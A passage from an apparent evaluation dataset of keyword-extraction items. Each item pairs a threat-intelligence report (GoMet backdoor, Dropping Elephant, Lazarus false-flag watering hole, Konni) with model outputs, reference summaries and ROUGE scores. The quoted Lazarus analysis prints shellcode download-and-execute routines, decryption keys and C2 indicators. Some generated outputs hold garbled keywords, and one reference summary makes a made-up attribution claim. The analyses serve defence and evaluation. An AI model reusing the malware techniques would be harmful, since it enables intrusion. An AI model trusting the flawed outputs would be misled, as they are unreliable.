agent; the cronjob; the C2; sleep; time; the initial code; a backdoor; a remote code execution vulnerability; Sophos Firewall; access; an hour; the C2; the cron job; a remote command; the agent component; a nyc; a call; the ssl; a command; the backdoor; a shell; the C2; the attack; May; the campaigns; Russian state-sponsored actors; access.", "ref_text": "<START-1>The PDF discusses the use of a backdoor called GoMet to target a large Ukrainian software development company since the start of Russia's invasion. GoMet is an open-source backdoor written in Go that provides remote access capabilities. Though the threat actor is unknown, Cisco Talos assesses the campaign is likely by Russian state-sponsored groups or those aligned with their interests. As the targeted company makes software used across Ukrainian state organizations, the attackers may intend to compromise the supply chain. The PDF analyzes GoMet's functionality like command execution, file operations, and daisy chaining to other systems. It highlights modifications made to the public GoMet code in this campaign, like more aggressive reconnecting. Details are provided on the malware's activity, including fake Windows updates and novel persistence by replacing existing autorun values. The IP address 111.90.139[.]122 was identified as the hardcoded command and control server. The PDF concludes by emphasizing the variety of cyber threats facing Ukraine and the determination of Russia-aligned actors. It stresses the need for continued vigilance and support against such attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.24324324324324326, "t5/word/hint_hit_recall": 0.06896551724137931, "gpt3/lexical/rouge_rouge1": 0.4936708860759494, "gpt3/lexical/rouge_rouge2": 0.1337579617834395, "gpt3/lexical/rouge_rougeL": 0.2468354430379747, "gpt3/lexical/rouge_rougeLsum": 0.2468354430379747, "gpt3_generated_text": ["In response to the ongoing Russian invasion of Ukraine, a sophisticated malware campaign has been uncovered targeting a prominent software development company in Ukraine, potentially orchestrated by Russian state-sponsored actors. The malware, known as GoMet, is a modified version of an open-source backdoor first posted on GitHub in March 2019. The backdoor allows for various functions such as job scheduling, remote command execution, file download/upload, and shell access. The attackers modified the code to increase its frequency of execution, making it more conspicuous but also more resilient to connection failures. The malware also exhibited novel persistence techniques, including creating fake Windows update tasks and replacing autorun values. This campaign is just one of many cyber attacks targeting Ukrainian organizations, highlighting the ongoing threat posed by state-sponsored actors in cyberspace."]}, {"split_name": "val", "sample_id": "val_79", "prompt_text": "Extract the keywords: 2016/7/14The Dropping Elephant actor - SecurelistThe Dropping Elephant \u2013 aggressive cyber- espionage in the Asian regionBy GReAT on July 8, 2016. 5:57 amRESEARCHAPT SPEAR-PHISHING VULNERABILITIESGReAT Kaspersky Lab's Global Research & Analysis Team@e_kaspersky/greatDropping Elephant (also known as \u201cChinastrats\u201d and \u201cPatchwork\u201c) is a relatively new threat actor that is targeting a variety of high profile diplomatic and economic targets using a custom set of attack tools. Its victims are all involved with China\u2019s foreign relations in some way, and are generally caught through spear  phishing or watering hole attacks.Overall, the activities of this actor show that low investment and ready made offensive toolsets can be very effective when combined with high quality social engineering. We have seen more such open source toolset dependency with meterpreter and BeEF, and expect to see this trend continue.The Attack Method: Infection VectorDropping Elephant uses two main infection vectors that share a common, and fairly elaborately maintained, social engineering theme \u2013 foreign relations with China.The first approach involves spear phishing targets using aurl Dropping Elephant actor - Securelistdocument with remote content. As soon as the user opens the document, a \u201cping\u201d request is sent to the attackers\u2019 server. At this point, the attackers know the user has opened the document and send another spear phishing email, this time containing an MS Word document with an embedded executable. The Word document usually exploits CVE 2012 0158. Sometimes the attackers send an MS PowerPoint document instead, which exploits CVE 2014 6352.Once the payload is executed, an UPX packed AutoIT executable is dropped. Upon execution, this downloads additional components from the attackers\u2019 servers. Then the stealing of documents and data begins.The second approach involves capturing victims through watering hole attacks. The actor created a website that downloads genuine news articles from other websites. If a website visitor wants to view the whole article they would need to download a PowerPoint document. This reveals the rest of the article, but also asks the visitor to download a malicious artifact.The two main infection vectors are supported by other approaches. Sometimes, the attackers email out links to their watering hole websites. They also maintain Google+, Facebook and twitter accounts to develop relevant SEO and to reach out to wider targets. Occasionally, these links get retweeted, indiscriminately bringing more potential victims to their watering holes.The Attack Tools1. Malware AnalysisThe backdoor is usually UPX packed but still quite large in size. The reason for this is that most of the file comprises meaningless overlay data, since the file is an automatically generated AutoIT executable with an AutoIT3 script embedded inside. Once started, it downloads additional malware from the C2 and also uploads some basic system information, stealing, among other things, the user\u2019s Google Chrome credentials. The backdoor also pings the C2 server at regular intervals. A good security analyst can spot this while analyzing firewall log files and thereby find out that something suspicious might be going on in the network.Generally speaking, backdoors download additional malware inurl Dropping Elephant actor - Securelistthe form of encrypted or packed executables/libraries. But, in the case of Dropping Elephant, the backdoor downloads encoded blobs that are then decoded to powershell command line \u201cscripts\u201d. These scripts are run and, in turn download the additional malware.One of the more interesting malware samples downloaded is the file stealer module. When this file stealer is executed, it makes another callback to the C2 server, downloading and executing yet another malware sample. It repeatedly attempts to iterate through directories and to collect files with the following extensions: doc, docx, ppt, pptx, pps, ppsx, xls, xlsx, and pdf. These files are then uploaded to the C2 server.Also interesting are the resilient communications used by this group. Much like the known actors Miniduke or CommentCrew, it hides base64 encoded and encrypted control server locations in comments on legitimate web sites. However, unlike the previous actors, the encrypted data provides information about the next hop, or the true C2 for the backdoor, instead of initial commands.2. C2 AnalysisIn many cases it was very difficult to get a good overview of the campaign and to find out how successful it is. By combining KSN data with partner provided C2 server data, we were able to obtain a much fuller picture of the incident.We examined connections and attack logins to this particular C2. As it turned out, the attackers often logged in via a VPN, but sometimes via IPs belonging to an ordinary ISP in India. We then looked at the time the attackers were active, of which you can find an image below.url Pro\ufb01le and Geography3/102016/7/14Victim Pro\ufb01le and GeographyThe Dropping Elephant actor - SecurelistWe also wanted to get a better idea of the geolocation of most visitors. Analysis of the image provided access counts and times, along with the IP of the visiting system.Noteworthy are the many IPs located in China. This focus on China related foreign relations was apparent from the ongoing social engineering themes that were constant throughout the attacks. The concentration of visits from CN (People\u2019s Republic of China) could be for a variety of reasons \u2013 diplomatic staff are visiting these sites from their CN offices, CN academics and analysts are very interested in researching what they believe to be CN focused think tanks, or some of the IPs are unknown and not self identifying as bots or scrapers. Regardless, because we were able to determine that multiple targets are diplomatic and governmental entities, these foreign relations efforts are likely to represent the main interest of the attackers.ConclusionCampaigns do not always need to be technically advanced to be successful. In this case, a small group reusing exploit code, some powershell based malware and mostly social engineering has been able to steal sensitive documents and data from victims since at least November 2015.Our analysis of the C2 server confirmed the high profile of most victims, mainly based in the Asian region and specially focused on Chinese interests. Actually, some hints suggest the group has been successful enough to have recently expanded its operations, perhaps after proving its effectiveness and the value of the data stolen.This is quite worrying, especially given the fact that no 0 days or advanced techniques were used against such high profile targets. Simply applying software patches will prevent attacks based on old exploits, as well as training in the most basic social engineering attacks.However, it should be noted that in this case Microsoft\u00b4s patch for exploit CVE 2014 1761 just warns the user not to allow the execution of the suspicious file.url Dropping Elephant actor - SecurelistDropping Elephant artifacts are detected by Kaspersky Lab products as: Exploit.Win32.CVE 2012 0158.* Exploit.MSWord.CVE 2014 1761.* Trojan Downloader.Win32.Genome.* HEUR:Trojan.Win32.GenericAs usual Kaspersky Lab actively collaborates with CERTs and LEAs to notify victims and help to mitigate the threat. If you need more information about this actor, please contact intelreports@kaspersky.comMore information on how Kaspersky Lab technologies protect against such cyberespionage attacks is available on Kaspersky 13_Five_Year_Plan_2016 20 1.pps Reconciliation_China\u2019s_PLAN.doc url url url url url cn[.]org alfred.ignorelist[.]com url url url url url url ussainbolt.mooo[.]com ussainbolt1.mooo[.]com updatesys.zapto[.]org updatesoft.zapto[.]orgC2 redirectors (with obfuscated comments)url url url url url url Dropping Elephant actor - SecurelistUpdate: our friends from Cymmetria have released their analysis of the Dropping Elephant / Patchwork APT \u2013 make sure to check it as well for more data about the attacks.Related PostsOPERATION DAYBREAKCVE-2016-4171 \u2013 ADOBE FLASH ZERO-DAY USED THREATSurl ", "generated_text": "the document; Dropping Elephant; Chinesestrats; Patchwork; the campaigns; Chinese; foreign relations; spear phishing; watering hole attacks; the attackers; The first approach; a ping request; the user; another spear phishing email; MS Word; the payload; additional components; the backdoor; further malware; the C2 server; uploads; data; the backdoor; PowerShell scripts; additional malware; the C2 server; the victims; the malware; extensions; docx; pptx; ppsx; xls; xxls; pdf; the malware; the C2 server; persistent communication; the campaign; meterpreter; BeEF.", "ref_text": "<START-1>The PDF describes research and analysis conducted by Kaspersky Lab on a threat actor group named Dropping Elephant, also known as Chinastrats and Patchwork. The key points are: - Dropping Elephant targets high-profile diplomatic and economic organizations related to China's foreign relations. They use spear phishing and watering hole attacks. - Two main infection vectors are used. One sends a document that phones home when opened, followed by an exploit document to install malware. The other uses a website that requires downloading a document to see full articles, which contains an exploit. - The malware is an AutoIT backdoor that downloads additional components. It steals documents and data like Chrome credentials. - Infrastructure analysis revealed the campaign has been ongoing since at least November 2015. Most victims were in Asia with a focus on Chinese interests. - The group reuses some publicly available tools but combines them effectively with social engineering for successful attacks against high-value targets. - The malware artifacts are not technically advanced, using basic exploits, powershell scripts, and open source tools. Keeping software patched prevents much of the malware. - Attribution analysis tied the group to a threat actor using the alias \"Aleksandr Sirofimov\" which has been linked to previous cybercrime campaigns since 2015. The group may originate from Eastern Europe. In summary, Dropping Elephant is a relatively new but active threat group that has been successfully targeting organizations related to China's foreign relations through simple but cleverly social engineered attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.2926829268292683, "t5/word/hint_hit_recall": 0.0860655737704918, "gpt3/lexical/rouge_rouge1": 0.40223463687150834, "gpt3/lexical/rouge_rouge2": 0.16292134831460672, "gpt3/lexical/rouge_rougeL": 0.2513966480446928, "gpt3/lexical/rouge_rougeLsum": 0.2513966480446928, "gpt3_generated_text": ["The Dropping Elephant, also known as Chinastrats and Patchwork, is an aggressive cyber-espionage threat actor targeting high-profile diplomatic and economic targets involved in Chinese foreign relations. The actor utilizes spear phishing and watering hole attacks to infect victims with malware, including exploiting vulnerabilities in MS Word and PowerPoint documents. The malware includes a backdoor that downloads additional components from the attackers' servers, such as PowerShell scripts and file stealers to collect and upload data to the C2 server. The attackers maintain resilient communication channels, hiding control server locations in legitimate websites' comments. The campaign demonstrates the effectiveness of low investment and ready-made offensive toolsets, highlighting the importance of social engineering in cyber-espionage activities."]}, {"split_name": "val", "sample_id": "val_80", "prompt_text": "Extract the keywords: 6\u2f00\u00bbBAE SYSTEMS THREAT RESEARCHBLOG\u2f74 \u2f0aResources Contact usHomeProductsSolutionsNews & EventsPartnersAbout UsCareersSEARCHTHREAT RESEARCH BLOGHome \u00bb Unlabelled \u00bb Lazarus\u2019 False Flag MalwarePosted by Sergei Shevchenko - Monday, 20 February 2017 LAZARUS\u2019 FALSE FLAG MALWAREWritten by Sergei Shevchenko and Adrian NishBACKGROUNDWe continue to investigate the recent wave of attacks on banks using watering-holes on at least two financial regulator websites as well as others. Our initial analysis of malware disclosed in the BadCyber blog hinted at the involvement of the 'Lazarus' threat actor. Since the release of our report, more samples have come to light, most notably those described in the Polish language niebezpiecznik.pl blog on 7 February 2017.MD5 hash9216b29114fb6713ef228370cbfe dN/AN/A2016-10- 04:11N/AN/AWin64 470 KBN/AN/A2017-01- 15:15Of the hashes provided, only three samples could be found in public malware repositories. All three had been submitted from Poland in recent weeks.In the analysis section below we examine these and the \u2018false flag\u2019 approach employed by the attackers in order to spoof the origin of the attack. The same \u2018false flag\u2019 approach was also found in the SWF-based exploit mentioned in our previous 2016-12-07 23:15Here we\u2019ll analyse these files as well as shed further light on the watering-hole exploit kit code itself, in the hope this aids further detection and network defence.ANALYSISSample #1 \u2013 srservice.chmMost likely, this file is an encrypted backdoor that is decrypted and injected by DLL loader. The filename srservice.chm is consistent with the method in which a known Lazarus toolkit module constructs CHM and HLP file names:%SYSTEMROOT%\\Help\\%MODULE_NAME%.chm %SYSTEMROOT%\\Help\\%MODULE_NAME%.hlpSample #2 \u2013 srservice.hlpMost likely, this file is an encrypted configuration file, which is decrypted and loaded by the sample #1 (srservice.chm).Sample #3 \u2013 srservice.dllThis DLL loads, decrypts and injects the 'CHM' file into the system lsass.exe process.Sample #4 \u2013 fdsvc.exeThis file is a command line tool that accepts several parameters such as encrypted file name and process ID. The tool reads and decrypts the specified file, and then injects it into the specified process or into the system process explorer.exe.The encryption consists of a running XOR, followed with RC4, using the 32-byte RC4 key below:A6 EB 96 00 61 B2 E2 EF 0D CB E8 C4 5A F1 66 9C A4 80 CD 9A F1 2F 46 25 2F DB 16 26 4B C4 3F 3CSample #5 \u2013 fdsvc.dllThe file fdsvc.dll is an encrypted file, successfully decrypted into a valid DLL fdsvc.exe.Once decrypted, it represents itself as a bot that accepts the C&C name and port number(s) as a string parameter that is used to call the DLL. The parameter is encoded with an XOR loop that includes XOR key cEzQfoPw.Multiple C&C servers can be delimited with the '|' character and port numbers are delimited from the C&C servers with the ':' character.Once the bot has established communication with the remote C&C, it uses several transliterated Russian words to either indicate the state of its communication or issue backdoor commands, such as:State/Backdoor Command start communication sessionWord \"Nachalo\" \"ustanavlivat\" handshake state \"vykhodit\"receive data send data maintain communication session exit communication sessionThe binary protocol is custom. For example, during the \"ustanavlivat\" (handshake) mode, the bot accepts 4 bytes, which are then decrypted. The decryption is a loop that involves multiple XOR operations performed over the received data. Once decrypted, the 4 bytes indicate the size of the next data chunk to be received.The next received data chunk is also decrypted, and its contents checked to see whether it's one of the backdoor commands.For example, the \"poluchit\" command instructs the bot to receive the file, and the \"pereslat\" (send) command instructs the bot to upload the file. The received \"poluchit\" command may also contain a URL, marked with another transliterated Russian word \"ssylka\" (link). In this case, the remote file is fetched in a separate thread. If a received data chunk contains the command \"vykhodit\", the bot quits its backdoor loop.The bot implements the SSL/TLS protocol, and is based on a source code of \"Curl v7.49.1\". Hence, it is able to transfer files via HTTP, HTTPS, FTP, SMTP and many other protocols, with full support of user/password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), proxies and SSL certificates.Russian language used in fdsvc.dllIn spite of some 'Russian' words being used, it is evident that the malware author is not a native Russian speaker.Of our previous examples, five of the commands were likely produced by an online translation. Below we provide the examples and the correct analogues for reference:Word\"ustanavlivat\"\"poluchit\" \"pereslat\" \"derzhat\"\"vykhodit\"Type of error omitted sign at the end, verb tense error omitted sign at the end omitted sign at the end omitted sign at the end omitted sign at the end, verb tense errorCorrect analogue\"ustanovit'\" or \"ustanoviti\"\"poluchit'\" or \"poluchiti\" \"pereslat'\" or \"pereslati\" \"derzhat'\" or \"derzhati\"\"vyiti\"Another example is \"kliyent2podklyuchit\". This is most likely a result of an online translation of \"client2connect\" (which means 'client-to-connect'). In this case, the two words \"client\" and \"connect\" were translated separately, then transliterated from the Russian pronunciation form into the Latin alphabet and finally joined to produce \"kliyent2podklyuchit\".Such a result may look impressive to the bot's author, but would be difficult to understand for native Russian speakers.Here we provide an example of translating the word \"client\" in Russian - the word \"kliyent\" here only demonstrates phonetic pronunciation, not how it's actually written in a transliterated form. When formed using the Latin alphabet, it would actually be written \"client\" or \"klient\".Due to such inconsistencies, we conclude that the Russian language is likely used as a decoy tactic, in order to spoof the malware\u2019s country of origin.Sample #6 \u2013 cambio.swfDuring the investigation of the watering-hole incident, the owner of a compromised website shared with us a malicious implant that was added into the site, presumably by using an exploit against JBoss 5.0.0.The script is called view_jsp.java and is accessed from the watering-hole website as view.jsp.This script is responsible for serving cambio.swf.The infection starts from a primary web site being compromised so that its visitors are redirected into a secondary website, calling its view.jsp script from an added IFrame. The initial request contains parameter pagenum set to 1, such as:\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\"This begins the profiling and filtering to identify potential victims. For example, the script then checks to see if the client's IP is black-listed. If so, such initial request is rejected.Next, the script checks if the client\u2019s IP is white-listed (i.e. targeted). If not white-listed, it is also rejected. Hence, unless the visitor\u2019s IP is on the attackers\u2019 list, the script will not attempt to infect their machine. This helps the infected websites stay undetected for relatively long period of time, as they only serve exploits to the selected targets.In the next stage of the script, it builds and serves back to the client an HTML page with an embedded JavaScript that detects the type of client\u2019s browser (Internet Explorer, Google Chrome, Firefox, Safari, or Opera), OS version, and the loaded plugins, such as Adobe Flash and Microsoft Silverlight.The script executed on a client side then builds a form, and submits it back to the gateway script, as shown below:The submitted form specifies the pagenum parameter to be set to 2, to advance the script to the next step:Once the script accepts the incoming request and finds the form's pagenum value is 2, it reads other fields from the submitted form and decides which exploit to serve back to the client.At the time of writing, the exploit kit known to serve back two exploits, for Adobe Flash and Microsoft Silverlight, though these could be expanded upon as needed.The exploits can be individually enabled or disabled by the attackers with the standalone file config.dat. For example, to enable both exploits (flag=1), the contents of this file can be set to:2016-0034:1 0000-0001:1where 2016-0034 identifies the Silverlight exploit, and 0000-0001 is the Flash exploit.If the script detects that the submitted form contains a non-empty version of Silverlight browser plugin, it will generate and serve back a Silverlight exploit. If the submitted form has a non-empty version of Adobe Flash browser plugin, the script will generate and serve back the Flash exploit. If the client has both plugins loaded within the browser, then the script will serve the Flash exploit only.NOTE: the script only serves the Flash exploit if the browser is Internet Explorer.The exploits are generated by the functions:\u2022 genExp_20160034() \u2013 to generate Silverlight exploit \u2022 genExp_00000001() \u2013 to generate Flash exploitThe latter is explained in further detail below. First, the script builds URL string namedas download_url:01 String PARAMNAME_UID = \"uid\"; 02 String PARAMNAME_PAGENUM = \"pagenum\"; 03 String PARAMNAME_EXPLOITID = \"eid\"; 04 String PARAMNAME_STATUS = \"s\"; 05 String PARAMNAME_DATA = \"data\"; 06 07 download_url = request.getRequestURL() + 13 download_url = download_url + 14 15\"?\" + PARAMNAME_UID + \"=\" + uid + \"=\" + exploit.get(\"eid\");\"&\" + PARAMNAME_STATUS + \"=2\" + \"&\" + PARAMNAME_DATA + \"=\";For example, the URL string may look like:url uid=30304811&pagenum=3&eid=00000002&s=2&data=Note that the pagenum parameter of the URL has now advanced to 3 (third step of the view.jsp execution).This URL string will be embedded by the genExp_00000001() function into the body of the shellcode.The output of the genExp_00000001() function is JavaScript that has the following format \u2013 this script will be executed inside the client's browser:// base64-decode string s01 var laskfji = 'PGh0bWw+ '; // long string here 02 asdlfkj = function(s) { 05 var polkio = asdlfkj(laskfji); 06 var poikea = 'document.write(polkio);'; 07 eval(poikea);Once the string s is base64-decoded by client-based JavaScript, it will look like a Flash object embedded into HTML:<body>01 <html> 21 </html></object></body><object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\"codebase=\"url\" width=\"1\" height=\"1\" ><param name=\"movie\" value=\"include/cambio.swf\" /> <param name=\"allowScriptAccess\" value=\"always\" /> <param name=\"FlashVars\"value=\"shell=558BEC83 00&Health=polki89jdm#ks@\" /><param name=\"Play\" value=\"true\" /> <embed type=\"application/x-shockwave-flash\"width=\"1\" height=\"1\" src=\"include/cambio.swf\" allowScriptAccess=\"always\" FlashVars=\"shell=558BEC83 00&Health=polki89jdm#ks@\" Play=\"true\"/>As seen in the Flash object parameters, the SWF object is served from the website\u2019s path:include/cambio.swfHowever, the SWF object is also accompanied with 2 extra parameters:SWF Parameter Value polki89jdm#ks@By looking into the decompiled cambio.swf file, its ActionScript reveals that the SWF file indeed expects 2 parameters: Health and shell.The value of Health is used as an XOR key to decode the binary blob orinBin, which is included in the SWF file. This blob is then loaded with loadBytes(), as shown below:01 objLoader = new Loader(); 02 this.params = loaderInfo.parameters; 03 04 var key:String = params[\"Health\"] as String; 05 var pShell:String = params[\"shell\"] as String; 06 var objShellData:SharedObject = SharedObject.getLocal(\"Exp_Data\"); 07 objShellData.clear(); 08 objShellData.data.shell = pShell; 09 objShellData.flush(); 10 var blob:ByteArray = new orinBin() as ByteArray; 11 var i:int = 0; 12 while(i < blob.length) 17 blob.position = 0; 18 objLoader.contentLoaderInfo.addEventListener(\"complete\",fncomp); 19 objLoader.loadBytes(blob);blob[i] = blob[i] ^ key.charCodeAt(i % key.length); i++;Below is the binary blob orinBin as seen within the SWF file:By knowing the value of Health parameter, it is now possible to use it as an XOR key to decode the orinBin blob within the SWF code.Once decrypted, the orinBin blob presents another SWF file. This time, it contains 3 encrypted blobs within: bin22, bin23, and bin24 seen below:The code decrypts the blobs with RC4, using \"littleEndian\" as the RC4 key. These blobs also turn out to be SWF files that contain the SWF exploit code.Internally, the ActionScript also uses transliterated Russian words, similar to the tactic seen in the bot code:Transliterated Russian words used in AS Translated from Russian babaLEnaPreparation of farm animals Hey, hey, hey 3 times Dummy (a stupid person) Dummy's address Let\u2019s search for data Searching in 'pro' Calling the dummy (a stupid person) Get address of the dummy Execute farm animals Old woman LenaAs seen in the table, while the words are technically Russian, their usage is out-of- context.In one code fragment, the ActionScript contains both \"chainik\" and \"dummy\":return chainik.call.apply(null,param1);01 private function put_dummy_args(param1:*) : * 05 private function vyzov_chainika() : * 08 }return chainik.call(null);As such, it is obvious that the word \"dummy\" has been translated into \"chainik\". However, the word \"chainik\" in Russian slang (with the literal meaning of \"a kettle\") is used to describe an unsophisticated person, a newbie; while, the word \"dummy\" in the exploit code is used to mean a \"placeholder\" or an \"empty\" data structure/argument.In the same way, it is likely the word \"farm animals\" was originally used to represent \"a beast\". Yet, it has been translated into a word that is only synonymous to \"the beast\" in a certain context.As a result, they have used the words \"farm animals\" across the shellcode instead of \"beast\"; which makes little sense.As in the case of sample #5 (fdsvc.dll), it is likely that this loose Russian translation, evidently performed by a non-Russian speaker, is intended to spoof the malware origin.ShellcodeThe SWF's ActionScript then loads and executes the shellcode that was passed to the SWF file. As with the Health parameter, by having access to the server-side code it is now possible to analyse what shellcode has been served to be executed via SWF file.The shellcode consists of 2,372 bytes of a Win32-code (in fact, 2,369 bytes padded with three zero bytes to make it 4-byte aligned).The shellcode passed via the shell parameter consists of two parts:\u2022 The first part of the shellcode (818 bytes) creates a hidden process of notepad.exe. It then injects the second part of the shellcode into it using the VirtualAlloc() and WriteProcessMemory() APIs, and finally it runs the injected code with CreateRemoteThread() API.\u2022 The second part of the shellcode (1,551 bytes) is encoded with XOR 0x57:seg000:00000316 seg000:0000031B seg000:00000320 loop: seg000:00000326mov ecx, 1551 ; counter mov ebx, 57h ; XOR keyxor [eax], ebx dec ecx ; decrement counter inc eax ; advance pointer test ecx, ecx jnz short loopIt's worth noting that both parts of the shellcode load the APIs similarly to all other tools from the Lazarus toolset, e.g.:01 urlmon_dll = 'mlrU'; // Urlm 02 urlmon_dll_4 = 'd.no'; // on.d 03 urlmon_dll_8 = 'll'; // ll 04 URLDownloadToFileW = 'DLRU'; // URLD 05 URLDownloadToFileW_4 = 'lnwo'; // ownl 06 URLDownloadToFileW_8 = 'Tdao'; // oadT 07 URLDownloadToFileW_12 = 'liFo'; // oFile 08 URLDownloadToFileW_16 = 'We'; // eW 09 hLib = LoadLibrary(&urlmon.dll); 10 ptr[8] = (*(int)ptr[4])(hLib, // ptr[4]->GetProcAddress 11 &URLDownloadToFileW);Once decoded, the second part of the shellcode reads the URL embedded at the end,then downloads and saves a file under a temporary file name, using the prefix \"tmp\".Next, it reads the temporary file into memory, decrypts it with the following XOR loop, starting from the 318th byte:01 for (i = 317; i < file_size; ++i ) 04 }buffer[i] ^= 0xCC ^ ((buffer[i] ^ 0xCC) >> 4);Next, it makes the decoded data executable by assigning it PAGE_EXECUTE_READWRITE memory protection mode, and calls it, as shown below:01 (*(void)(ptr[68]))(buffer + 318, // ptr[68]->VirtualProtect 02 file_size - 318, // skip the first 318 bytes 05 ((void (*)(void))(buffer + 318))(); // CALL from the 318th bytendThis way, the 2 part of the shellcode downloads a binary from the same gateway script as before. pagenum=3 means it's a 3 step \u2013 a step of serving the next chunk of the shellcode.rdTo understand the next step we need to go back to the gateway script to see how it processes the pagenum=3 request.When the script receives a pagenum=3 request, it checks the 's' URL parameter ('status'). Initially, this parameter is set to 2 ('s=2', as seen in the aforementioned URL embedded into the SWF exploit).Thus, the script will read and output the contents of 2 files stored on the web server:files/mark180789172360.ico files/back283671047171.datThe first file is likely a valid ICO file, is 318 bytes in size, and its contents are not encoded (hence the reason why the shellcode skips the first 318 bytes, and only decodes the rest).The second file is a 3 chunk of the shellcode, and its contents are encoded.rdIn addition to these 2 files, the output is appended with a URL. This time, it will specify pagenum parameter set to 3, but the status parameter s will now be set to 3. For example, the URL may look like:url appended URL will then be encoded the same way as the file back283671047171.dat:01 for (int i = 0; i < len + 9; i++) 08 }byte var = b[i]; byte temp = (byte)((var >> 4) & 0x0F); var = (byte)(var ^ temp); var = (byte)(var ^ 0xCC); b[i] = var;This way, the encoded URL becomes an integral part of the 3 part of the shellcode \u2013 same way as the 2 part of the shellcode was appended with a URL.ndrdFollowing that, the script serves back a blob that consists of three parts:\u2022 files/mark180789172360.ico, not encoded (318 bytes) \u2022 files/back283671047171.dat, encoded \u2022 download URL, encodedIt is served back as a binary file, disguised as an icon file probg[RANDOM].ico, probably in an attempt to bypass network sniffers (in other words, the encrypted shellcode is served appended to a valid icon file):response.setHeader(\"Accept-Ranges\", \"bytes\"); response.setHeader(\"Content-Length\", String.format(\"%d\", response_len)); response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"probg\" + rand.nextInt(9000) + 10000 + \".ico\\\"\"); response.setHeader(\"Content-Type\", \"application/octet- stream\");rdOnce this 3 part of the shellcode is served back to the shellcode that runs on a client side, it will skip the first 318 bytes, decode the rest and execute it. This will invoke another binary download \u2013 this time identified with the status value of 3 ('s=3').The new binary is generated by view.jsp script and is almost identical to the 3 rd part of the shellcode.The only difference is that the binary blob consists of these files:files/mark180789172360.ico, not encoded (318 bytes), as before files/meml102783047891.dat, encodedndThe 2 file is now different, and the URL is no longer appended. The reason why the new binary does not need the URL embedded may be that this binary contains an actual malicious executable, detached, decoded, and executed by the shellcode, thus leading to a full compromise of the victim.Indeed, as seen in the web log below, the last GET request with the pagenum=3 and s=3 parameters is served with a 123,710-byte response \u2013 large enough to accommodate a PE-executable:\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\" 200 66148 \"POST /[PATH]/view.jsp HTTP/1.1\" 200 13991 \"GET /[PATH]/view.jsp? uid=30304811&pagenum=3&eid=00000002&s=2&data= HTTP/1.1\" 200 4642 \"GET /[PATH]/view.jsp?uid=30304811&pagenum=3&s=3 HTTP/1.1\" 200 123710NOTE: At the time of analysis, the ICO/DAT files were not available. Hence, their contents remains unknown.Overall SchemeThe following scheme illustrates the steps outlined above:CONCLUSIONSHere we have analysed further files from the recent watering-hole attacks directed at Polish financial institutions and others. Evidently, the Lazarus group are continuing their campaign targeting banking networks. Their watering-hole mechanism is fairly sophisticated \u2013 its multiple stages are designed to complicate analysis of its malware distribution, and at the same, stay undetected for as long as possible.Because of the previously disclosed attribution links, the group are also resorting to some trickery.Through reverse-engineering, we can see the use of many Russian words that have been translated incorrectly. In some cases the inaccurate translations have transformed the meaning of the words entirely. This strongly implies that the authors of this attack are not native Russian speakers and, as such, the use of Russian words appears to be a 'false flag'. Clearly the group behind these attacks are evolving their modus operandi in terms of capabilities \u2013 but also it seems they\u2019re attempting to view.jsp?pagenum=1 view.jsp?uid=MD5 HashesFilenamesURLsat 08:51+6 Recommend this on GoogleNo comments:Post a CommentEnter your comment Comment as: Select profile Publish PublishPreview PreviewOLDER POSTSUBSCRIBESign up to receive our regular Cyber Threat Bulletin.Sign upPOPULAR POSTSTWO BYTES TO $951MCYBER HEIST ATTRIBUTIONNEW MAC OS MALWARE EXPLOITS MACKEEPERCONTACTFor further information or to talk to an expert, please contact us.learn@baesystems.comContactAccessibilityTerms & conditionsPrivacySitemap\u00a9 2015 BAE Systems. All rightsreserved ", "generated_text": "the malware; banks; watering-holes; attacks; banks; banks; the attackers; the malware; srservice.chm; CHM; HLP; fdsvc.exe; a command; command; IP; port; system; explorer.exe; the C&C; the bot; remote access; Russian words; communication; the watering-hole exploit kit; the malware; the origin; this attack; the SWF exploit.", "ref_text": "<START-1>The document analyzes malware used in watering hole attacks on financial institutions attributed to the Lazarus cybercrime group. The malware uses false flags and misleading translations to disguise its origin and evade detection. The attacks start by compromising websites to serve exploits that download malware. The malware stages use encoded shellcode and downloading of components to complicate analysis. Decoding reveals loosely translated Russian words likely meant to mislead investigators into thinking the malware is from Russia. The multi-stage process ultimately leads to execution of unknown final payloads on target systems. The false flags and evolving techniques aim to avoid detection, but in-depth analysis enables attribution and highlights the need for continued monitoring of Lazarus campaigns. Defensive recommendations include implementing provided indicators of compromise. <END-1>", "t5/keyword/hint_hit_precision": 0.14285714285714285, "t5/word/hint_hit_recall": 0.04878048780487805, "gpt3/lexical/rouge_rouge1": 0.40163934426229503, "gpt3/lexical/rouge_rouge2": 0.09917355371900828, "gpt3/lexical/rouge_rougeL": 0.2377049180327869, "gpt3/lexical/rouge_rougeLsum": 0.2377049180327869, "gpt3_generated_text": ["The article discusses the recent wave of attacks on banks using watering-holes on financial regulator websites, involving the 'Lazarus' threat actor. The malware samples analyzed include srservice.chm, srservice.hlp, srservice.dll, fdsvc.exe, and fdsvc.dll. The attackers used a 'false flag' approach to spoof the origin of the attack. The malware includes encrypted backdoors, configuration files, DLL injections, and command line tools for reading, decrypting, and injecting files into processes like explorer.exe. The communication with C&C servers is conducted using a custom binary protocol and Russian words for issuing commands. This analysis sheds light on the malware's origin and methods used in the attacks, aiding in detection and network defense against similar threats."]}, {"split_name": "val", "sample_id": "val_81", "prompt_text": "Extract the keywords: New Konni Campaign Kicks Off the New Year by Targeting Russian Ministry of Foreign Affairsblog.lumen.com/new-konni-campaign-targeting-russian-ministry-of-foreign-affairs/January 5, 2022Black Lotus Labs Posted On January 5, 2022Executive Summary Black Lotus Labs, the threat research team of Lumen Technologies, uncovered a series of targeted actions against the Russian Federation\u2019s Ministry of Foreign Affairs (MID). Based upon the totality of information available and the close correlation with prior reporting, we assess with moderate confidence these actions leveraged the Konni malware, which has previously been associated with the Democratic People\u2019s Republic of Korea, and were undertaken to establish access to the MID network for the purpose of espionage. This activity cluster demonstrates the patient and persistent nature of advanced actors in waging multi-phased campaigns against perceived high-value networks. After gaining access through stolen credentials, the actor was able to exploit trusted connections to distribute and load the malware, first by impersonating a government software program coinciding with new Covid mandates, and then through sending trojanized files from a compromised account.1/10Introduction In October 2021, a presumed phishing campaign targeted the Russian Federation MID with 